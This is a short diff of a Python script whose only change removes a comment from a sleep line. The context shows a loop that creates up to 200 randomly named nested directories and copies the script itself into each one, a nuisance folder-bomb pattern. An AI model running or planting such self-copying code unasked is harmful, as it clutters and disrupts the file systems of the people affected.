@@ -15,7 +15,7 @@ count = 0
 
 while count < 200:
     name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
-    time.sleep(1) #cooldown, lower the value to make the process faster, higher the value to make the process slower (prevent lags)
+    time.sleep(1)
     os.mkdir(name)
     os.chdir(name)
     shutil.copy(f"../{sys.argv[0]}", os.getcwd())
